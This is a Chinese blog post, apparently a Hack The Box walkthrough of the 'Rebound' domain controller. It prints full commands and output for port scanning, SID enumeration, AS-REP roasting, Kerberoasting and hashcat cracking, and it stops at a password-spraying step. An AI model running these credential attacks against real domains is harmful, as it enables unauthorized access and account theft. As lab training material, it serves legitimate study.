---
layout: post
title: HTB——Rebound
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Rebound/01.png?raw=true)

# 0x01 信息收集

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.7  Expired: 2026.01.01
[21:53:47] [INFO] Start IpScan:10.129.88.234
[21:53:47] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[21:53:48] [+] 10.129.88.234:53 open
[21:53:48] [+] 10.129.88.234:88 open
[21:53:48] [+] 10.129.88.234:135 open
[21:53:48] [+] 10.129.88.234:139 open
[21:53:48] [+] 10.129.88.234:389 open
[21:53:48] [+] 10.129.88.234:445 open
[21:53:48] [+] 10.129.88.234:593 open
[21:53:48] [+] 10.129.88.234:464 open
[21:53:48] [+] 10.129.88.234:636 open
[21:53:49] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.88.234:389 [0.d.t.0.l0.domainFunctionality1.70.forestFunctiona]                                                       
[21:53:49] [INFO] start LDAP check 10.129.88.234:389         
[21:53:49] [+] 开始 LdapScan 任务: LDAP://10.129.88.234:389  
[21:53:49] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.88.234:593 [ncacn_http/1.0]
[21:53:49] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.88.234:135 [.@]
[21:53:49] [INFO] start WMI check 10.129.88.234:135
[21:53:49] [+] 开始 WmiExec 任务: WMI://10.129.88.234:135
[21:53:49] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.88.234:139 [.]
[21:53:55] [+] 10.129.88.234:5985 open
[21:53:59] [+] [TCP/SPARK]  [Apache Spark] 10.129.88.234:88 [.]
[21:54:00] [+] 10.129.88.234:9389 open
[21:54:00] [+] [TCP/KPASSWD5]   10.129.88.234:464 
[21:54:03] [+] [TCP/MICROSOFT-DS]   10.129.88.234:445 
[21:54:03] [INFO] start SMB check 10.129.88.234:445
[21:54:03] [+] 开始 SmbScan 任务: SMB://10.129.88.234:445
[21:54:07] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.88.234:5985 [Not Found]
[21:54:07] [INFO] start WinRM check 10.129.88.234:5985
[21:54:07] [+] 开始 WinRMScan 任务: WinRM://10.129.88.234:5985
[21:55:00] [+] 10.129.88.234:49667 open
[21:55:00] [+] 10.129.88.234:49666 open
[21:55:00] [+] 10.129.88.234:49665 open
[21:55:00] [+] 10.129.88.234:49664 open
[21:55:00] [+] 10.129.88.234:49729 open
[21:55:00] [+] 10.129.88.234:49673 open
[21:55:00] [+] 10.129.88.234:49690 open
[21:55:00] [+] 10.129.88.234:49691 open
[21:55:00] [+] 10.129.88.234:49697 open
[21:55:00] [+] 10.129.88.234:49740 open
[21:55:00] [+] 10.129.88.234:49711 open
[21:55:03] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.88.234:49690 [ncacn_http/1.0]
[21:55:21] [+] [TCP/UNKNOWN]   10.129.88.234:49673 
[21:55:21] [+] [TCP/UNKNOWN]   10.129.88.234:49691 
[21:55:21] [+] [TCP/UNKNOWN]   10.129.88.234:49697 
[21:55:21] [+] [TCP/UNKNOWN]   10.129.88.234:49666 
[21:55:21] [+] [TCP/UNKNOWN]   10.129.88.234:49665 
[21:55:21] [+] [TCP/UNKNOWN]   10.129.88.234:49711 
[21:55:21] [+] [TCP/UNKNOWN]   10.129.88.234:49740 
[21:55:21] [+] [TCP/UNKNOWN]   10.129.88.234:49664 
[21:55:21] [+] [TCP/UNKNOWN]   10.129.88.234:49667 
[21:55:21] [+] [TCP/UNKNOWN]   10.129.88.234:49729 
                                                           
[21:55:24] [+] alive ports is: 22
[21:55:24] [+] Ip扫描结束:10.129.88.234
[21:55:24] [INFO] Start UrlScan:http://10.129.88.234:5985
[21:55:26] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0] http://10.129.88.234:5985 [Not Found]
                                                 
[21:55:26] [+] Url扫描结束:http://10.129.88.234:5985
[21:55:26] [+] 项目任务完成:Default, Timeuse：99.148461178
[21:55:26] [+] 扫描结束,耗时: 1m40.118856055s

┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0
                                                                                                 
[2025-04-23 22:05:44] [INFO] 暴力破解线程数: 1                                                   
[2025-04-23 22:05:44] [INFO] 开始信息扫描
[2025-04-23 22:05:44] [INFO] 最终有效主机数量: 1
[2025-04-23 22:05:44] [INFO] 开始主机扫描
[2025-04-23 22:05:44] [INFO] 有效端口数量: 233
[2025-04-23 22:05:45] [SUCCESS] 端口开放 10.129.88.234:88
[2025-04-23 22:05:45] [SUCCESS] 端口开放 10.129.88.234:135
[2025-04-23 22:05:45] [SUCCESS] 端口开放 10.129.88.234:139
[2025-04-23 22:05:45] [SUCCESS] 端口开放 10.129.88.234:389
[2025-04-23 22:05:45] [SUCCESS] 端口开放 10.129.88.234:445
[2025-04-23 22:05:50] [SUCCESS] 服务识别 10.129.88.234:88 => 
[2025-04-23 22:05:50] [SUCCESS] 服务识别 10.129.88.234:139 =>  Banner:[.]
[2025-04-23 22:05:50] [SUCCESS] 服务识别 10.129.88.234:445 => 
[2025-04-23 22:05:50] [SUCCESS] 服务识别 10.129.88.234:389 => 
[2025-04-23 22:06:50] [SUCCESS] 服务识别 10.129.88.234:135 => 
[2025-04-23 22:06:50] [INFO] 存活端口数量: 5
[2025-04-23 22:06:50] [INFO] 开始漏洞扫描
[2025-04-23 22:06:50] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, webpoc, webtitle                                                                                   
[2025-04-23 22:06:50] [SUCCESS] NetInfo 扫描结果
目标主机: 10.129.88.234                                                                          
主机名: dc01                                                                                     
发现的网络接口:                                                                                  
   IPv4地址:                                                                                     
      └─ 10.129.88.234                                                                           
[2025-04-23 22:07:48] [INFO] SMB2共享信息 10.129.88.234:445 admin Pass:123456 共享:[ADMIN$ C$ IPC$ NETLOGON Shared SYSVOL]                                                                        
[2025-04-23 22:07:53] [SUCCESS] SMB认证成功 10.129.88.234:445 admin:123456
```

探测到的是windows主机，且没有外部web服务。我们只能开始打点各开放的其他服务。

```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -A 10.129.88.234
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 22:07 EDT
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.129.88.234
Host is up (0.12s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-24 09:07:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-24T09:08:47+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-24T09:08:48+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-24T09:08:47+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-24T09:08:48+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=4/23%OT=53%CT=1%CU=40462%PV=Y%DS=2%DC=T%G=Y%TM=68099D2
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=I%CI=I%II=I%TS=U)SEQ
OS:(SP=105%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=106%GCD=1%ISR=10D%
OS:TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=F3%GCD=1%ISR=111%TI=I%CI=I%II=I%SS=S%TS=
OS:U)SEQ(SP=FD%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M542NW8NNS%O2=
OS:M542NW8NNS%O3=M542NW8%O4=M542NW8NNS%O5=M542NW8NNS%O6=M542NNS)WIN(W1=FFFF
OS:%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M542
OS:NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
OS:T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-24T09:08:39
|_  start_date: N/A
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   123.73 ms 10.10.14.1
2   135.68 ms 10.129.88.234

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.70 seconds
```

首先使用nmap扫出主机域名，接下来我们查看一下fscan爆出的弱账密的SMB服务

```bash
┌──(root㉿kali)-[/home/kali]
└─# smbclient -L //10.129.88.234 -U admin                  
Password for [WORKGROUP\admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shared          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.88.234 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                 
┌──(root㉿kali)-[/home/kali]
└─# smbclient //10.129.88.234/shared -U admin
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Aug 25 17:46:36 2023
  ..                                  D        0  Fri Aug 25 17:46:36 2023

                4607743 blocks of size 4096. 1028915 blocks available
```

smb内并未共享有效信息。我们再尝试全面探测一下靶机，发现`enum4linux`也未探测出有效信息。我们转向尝试使用`impacket`的`lookupsid`套件来无认证枚举域内的用户组与用户。

```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-lookupsid gailo@10.129.88.234 -no-pass 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

//注意，以上为错误示例，使用此指令爆破我们会少获得到一部分用户名
//以下才是正确实例，指定域名并进行爆破

┌──(root㉿kali)-[/home/kali]
└─# impacket-lookupsid  -no-pass 'guest@rebound.htb' 20000
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at rebound.htb
[*] StringBinding ncacn_np:rebound.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: rebound\Administrator (SidTypeUser)
501: rebound\Guest (SidTypeUser)
502: rebound\krbtgt (SidTypeUser)
512: rebound\Domain Admins (SidTypeGroup)
513: rebound\Domain Users (SidTypeGroup)
514: rebound\Domain Guests (SidTypeGroup)
515: rebound\Domain Computers (SidTypeGroup)
516: rebound\Domain Controllers (SidTypeGroup)
517: rebound\Cert Publishers (SidTypeAlias)
518: rebound\Schema Admins (SidTypeGroup)
519: rebound\Enterprise Admins (SidTypeGroup)
520: rebound\Group Policy Creator Owners (SidTypeGroup)
521: rebound\Read-only Domain Controllers (SidTypeGroup)
522: rebound\Cloneable Domain Controllers (SidTypeGroup)
525: rebound\Protected Users (SidTypeGroup)
526: rebound\Key Admins (SidTypeGroup)
527: rebound\Enterprise Key Admins (SidTypeGroup)
553: rebound\RAS and IAS Servers (SidTypeAlias)
571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
1000: rebound\DC01$ (SidTypeUser)
1101: rebound\DnsAdmins (SidTypeAlias)
1102: rebound\DnsUpdateProxy (SidTypeGroup)
1951: rebound\ppaul (SidTypeUser)
2952: rebound\llune (SidTypeUser)
3382: rebound\fflock (SidTypeUser)
5277: rebound\jjones (SidTypeUser)
5569: rebound\mmalone (SidTypeUser)
5680: rebound\nnoon (SidTypeUser)
7681: rebound\ldap_monitor (SidTypeUser)
7682: rebound\oorend (SidTypeUser)
7683: rebound\ServiceMgmt (SidTypeGroup)
7684: rebound\winrm_svc (SidTypeUser)
7685: rebound\batch_runner (SidTypeUser)
7686: rebound\tbrady (SidTypeUser)
7687: rebound\delegator$ (SidTypeUser)
```

---

# 0x02 AS-REP攻击

枚举到了这些用户。制作成用户名字典，我们尝试一下AS-REP攻击。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─# impacket-GetNPUsers rebound.htb/ -usersfile user.txt -dc-ip 10.129.88.234
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jjones@REBOUND.HTB:35a9cd07d23580f4e909ba6fd1061e43$f2746f30305b886ae0cc5c32fa70ff3371e94336a540cc7b106fdab8815539ef42e759e46f71613d7d8900673966c897db1513b3c753d6d724128fd441f3dc9ca6813ec9dabbe8cabb7260be974f7af9a9f13b9d7974135d5702d41449f74e2fd9e18001f1dd82d7289aa676c7d21580c17299f2850b424d0c7b88d2f11e4ab7c413881ce7a16022b73f4c9ea04f038b1a7bdec7cb6bf33eb45880774ec8c1f6ee9de5b31e60a88a1bbec881bb58e424b7ff14440229be73567cf5b2ea4584a5c668a5e01fcfc097cc12fefdfa91078e7525ac3774908a0d4fb1483d652424d2b3739e70e133836f261f
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User delegator$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

成功获得了jjones的预认证信息，我们拿去hashcat爆破，发现爆破不出来，不愧是insane级别的机器。

---

# 0x03 通过AS-REP直接中继到Keberoasting攻击

查看WP学到了新知识：在AS-REP可攻击成功时，我们可在`impacket`的`GetUserSPNs`组件内，通过指定域内该用户的用户名并标明`-no-preauth`来直接进行`kerberoasting`攻击。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─# impacket-GetUserSPNs -no-preauth 'jjones' -usersfile 'user.txt' -dc-ip 10.129.88.234 rebound.htb/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$886251f68a520bf3e65565b0d8e1f25b$a72e77f256c7665fb20825c9c85a4e8caed79c459b772f8ac3fd4640a9e8867f4d6b92ef1bbf88aaaa67ae3e4ca5b864321bb85606f44b3ada3314f65046b961dce97b42a8d874859ab6db3ab151d5bd3d29a2a2529e8197389d46ca5f190f2b81191468f59d11be9f275368f06434844db5d25bb86c4360395f3ef5d16d80c3dfd98fb5f1b0e31999ab6b5ffc3f0bf9b8dda3252041cafa7c0635a24733af9ac038824b65d4f574dfdf04d70cb71254cd3dd5c4a448195136dbab2c7b05702c919f875e5c46f4c7c0b9c7b6c59ade5513f88bafe3b523afc0220b3af7a502ebc144485072e3059cc6ba3be20967dab4ef3d37fe6dd351a5485771f3d88d20fc5253837ee6cb75c353ebf9ccca915f96a9e5c3bf622866ad191c9e5743df5a75ed1eb2784c8866ec2bf9e1d2ecb9ac10653bf22ca85023e6a1b99f60eaaa732f8635405b8607dadd08b21b21dcba00110af8324d7192ae08e5f4c5b88978be3cc20f77d66deac9e71d00c0e1f09ae159fd66c8ce62138dee7ebdb600c44a746b762d0f05e9aebb4456be1fdb58beade0fb099d464c3d96f05da0c183176eb8ddc628b74f3e2c741288eb560e4b9aeb671f5ae580f569446c15f88c833ee7567c173e33c945795c93fa80cac01dab5046c9ee0ec98c5a9b5f4a50d6050ee53cc36a6955116e8883583453bf6f3bf3747ff2f28323a81b47985776dd3c2b34349fd4cf609ba74fdb4dee5eab5aa1f1928f0ba7d387ebe32e36292390e90b2ad9ef26eedd5e1565d9fae05a3df2323b53ada2f7bb022bdf898662d82d7492d168af0ab54d546a019aea2be88e4d7a36070dca40b97ff4585404677e3bb21ad84812298bce45b6105cfe779fc208d562a190bb914d225f75a3a49ba729b600d0fd2d79116033f5d7070389be2aa7c77a6adca751243a093e2b900640f43a0ea7d809dc83a9a72728af5e3e6d4aaa296094a3461c4123f1eecae8d56794bcdf44612fdc28215326dc5fa1942c7ddadab549ac0b48378a50055dfe4cbd3ae8cce5f7ef6d374a9a643221efd7d688d5d2033db82eff0e4294a6eeebc94f71214715f7125b15e1660acf83b16e5b2742044f555f6005c81a6be5e6d03c9a2ba74504283e6eb0b0e64f72aa737449daa08743d556332062a7f18bbb856f4f363bbdc688d94695d2a840273820105538d17671741d0c6c1452387df62d25fd1b6d4b1301a3de300a4977cfe497b7b7879e229cfe7e3a9f64f4f28bf391eeba723021424f4dcdebfe50c4c79c520cf1a1f3b0824309206705889808a2c312e8095f713c347251906fa4d5dfedb48588f0acdd3a9a44b529b53ffbf6aa753ae521017c444075508f
[-] Principal: oorend - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: winrm_svc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$delegator$$REBOUND.HTB$*delegator$*$68ffb4124fcb18f02a1751e5$330a4347c17654d3ce62a4e8f245da94a20ffbb0c81963c90ae8c21daa163ba2adc5e83ef3525732f42754ae8fc1644322cc2bba6eeed691a73421dee44b64bdca3589d5b1e9c2d57f69805f82a5d4fda746f8669a3fab5f47020f5586118130a3f2410a0c2918cf6867b773c78389122951828515df4c136019a0c54807300debae79af549475c87751734ce081f32b3d78bb619426e4ea1cf432b772bfabcfbdde862771b30da208c496c19cdaf8c92ecfa8bad828ec7f7cdbd1f7d116a72a3adda17bfcaad6ad5d49e39e35291eb63aa6011f88d8c4a34b9ce14114071fcb20f53c442aa5bd86e7af4ae61ee3426b6e1d201f0007642504a86f39c439757bc0b4464ff2c7af037deeacc3c48edb6a4e6290bcf9387a703c8f60b96c51d9875fb6820c66ecd232524f3aa465c8915c36c45111a77be44366e17aaf885731cc78e25f7d7ea70320b2613f57fa3304b2cd0c14052f08bffd554aa51dbd3d2a32442efa302644fcb660ecad0427a5feb0e0cf5028cd7adc0b350bcb032a7d87b39ce4cb209520def111f209460eef7202a2e90a834c7e1a5f190fa5746bb483f7026a10abab707f809d91ab82d34985feafd91f000cf9a4f8cc628263dd591107557f3dceb7b85c2a210e214db8529f4f38e31189b7e92ce9e2547daf14c12963350cff91ea97550a5db195c30677a6ba51b524d2f54bca8d0a3d4b721d5d043704e96352d8e0b7d122168cfb553c042a39c592ba614d0752ed647bfa963e998b6f2d4023194ca8f3e2dce5eb8cd7094169d8ffcc0b4d0b6d63af658545652c4bd39df25ea113399becba9722cbc406a5c7adc32b457d47767fee341bb97e5c939ebf482a2555a396cf04238dacc72c11f567fe8da39de8f32fadbffc0bb9a7ce779f64f8500d2dbd6a839c2ae5adc84bbde689e730a52d19313dacce47ab1c9b5fc9f3669d3d1cf18778721cc9bb1b810ba0edde0b52d149c3c65de44a6793f1eb93b7d48a9d8426e5e34f15d7680dcbf5f9205501e190b44d0cb8a004f971fe8e0ee13f8ec061edf2c159f014e2ea2afe8896002bdb0fd198d900c92784c5d6f88fcc477067547ae7c48804fcd228eb22370161d840896927c0f995c26bf51850f941cc33395873cb1d541be2c15b1d5910a775804e842a39b936c42c723b52952fe49d0c395122cf44e884318f447e831c77774b441884ca0a88f4a4fe271736998e8b98852c84bd1c9f5b978fbcb731e316171cf04dd73d01d0872bed7093e3a8057131e7ef353b256b4df89df6465d2419827257fad1505f89b30255137fb564c24e1556a1dcad3e64a459eae231c061018a2631af40083ec394f2a208029ecdb840ed5c1da3a691
```

再次尝试爆破一下这两个SPN，看能否有可用账户。

```bash
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$886251f68a520bf3e65565b0d8e1f25b$a72e77f256c7665fb20825c9c85a4e8caed79c459b772f8ac3fd4640a9e8867f4d6b92ef1bbf88aaaa67ae3e4ca5b864321bb85606f44b3ada3314f65046b961dce97b42a8d874859ab6db3ab151d5bd3d29a2a2529e8197389d46ca5f190f2b81191468f59d11be9f275368f06434844db5d25bb86c4360395f3ef5d16d80c3dfd98fb5f1b0e31999ab6b5ffc3f0bf9b8dda3252041cafa7c0635a24733af9ac038824b65d4f574dfdf04d70cb71254cd3dd5c4a448195136dbab2c7b05702c919f875e5c46f4c7c0b9c7b6c59ade5513f88bafe3b523afc0220b3af7a502ebc144485072e3059cc6ba3be20967dab4ef3d37fe6dd351a5485771f3d88d20fc5253837ee6cb75c353ebf9ccca915f96a9e5c3bf622866ad191c9e5743df5a75ed1eb2784c8866ec2bf9e1d2ecb9ac10653bf22ca85023e6a1b99f60eaaa732f8635405b8607dadd08b21b21dcba00110af8324d7192ae08e5f4c5b88978be3cc20f77d66deac9e71d00c0e1f09ae159fd66c8ce62138dee7ebdb600c44a746b762d0f05e9aebb4456be1fdb58beade0fb099d464c3d96f05da0c183176eb8ddc628b74f3e2c741288eb560e4b9aeb671f5ae580f569446c15f88c833ee7567c173e33c945795c93fa80cac01dab5046c9ee0ec98c5a9b5f4a50d6050ee53cc36a6955116e8883583453bf6f3bf3747ff2f28323a81b47985776dd3c2b34349fd4cf609ba74fdb4dee5eab5aa1f1928f0ba7d387ebe32e36292390e90b2ad9ef26eedd5e1565d9fae05a3df2323b53ada2f7bb022bdf898662d82d7492d168af0ab54d546a019aea2be88e4d7a36070dca40b97ff4585404677e3bb21ad84812298bce45b6105cfe779fc208d562a190bb914d225f75a3a49ba729b600d0fd2d79116033f5d7070389be2aa7c77a6adca751243a093e2b900640f43a0ea7d809dc83a9a72728af5e3e6d4aaa296094a3461c4123f1eecae8d56794bcdf44612fdc28215326dc5fa1942c7ddadab549ac0b48378a50055dfe4cbd3ae8cce5f7ef6d374a9a643221efd7d688d5d2033db82eff0e4294a6eeebc94f71214715f7125b15e1660acf83b16e5b2742044f555f6005c81a6be5e6d03c9a2ba74504283e6eb0b0e64f72aa737449daa08743d556332062a7f18bbb856f4f363bbdc688d94695d2a840273820105538d17671741d0c6c1452387df62d25fd1b6d4b1301a3de300a4977cfe497b7b7879e229cfe7e3a9f64f4f28bf391eeba723021424f4dcdebfe50c4c79c520cf1a1f3b0824309206705889808a2c312e8095f713c347251906fa4d5dfedb48588f0acdd3a9a44b529b53ffbf6aa753ae521017c444075508f:1GR8t@$$4u

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*...75508f
Time.Started.....: Thu Apr 24 10:44:57 2025 (0 secs)
Time.Estimated...: Thu Apr 24 10:44:57 2025 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (.\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 27736.3 kH/s (1.58ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13765529/14344386 (95.96%)
Rejected.........: 2969/13765529 (0.02%)
Restore.Point....: 11799265/14344386 (82.26%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 818697 -> 0843353513
Hardware.Mon.#1..: Temp: 49c Util: 15% Core:1950MHz Mem:14001MHz Bus:8
```

爆破出此可用账户后，我们检测其账户功能，发现并不能使用winrm登陆此账户，仅可通过SMB认证。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─# crackmapexec winrm 10.129.88.234 -u ldap_monitor -p '1GR8t@$$4u'
SMB         10.129.88.234   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
HTTP        10.129.88.234   5985   DC01             [*] http://10.129.88.234:5985/wsman
WINRM       10.129.88.234   5985   DC01             [-] rebound.htb\ladp_monitor:1GR8t@$$4u
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─# crackmapexec smb 10.129.88.234 -u ldap_monitor -p '1GR8t@$$4u'
SMB         10.129.88.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.129.88.234   445    DC01             [+] rebound.htb\ladp_monitor:1GR8t@$$4u
```

---

# 0x04 密码复用突破

那我们就使用bloodhound来收集一下域内信息，尝试进一步利用。结果发现此账户连域内的LDAP认证都通过不了，无任何利用价值。我们只得拿此密码在域内再喷洒一下，看看有无密码复用的。

```bash
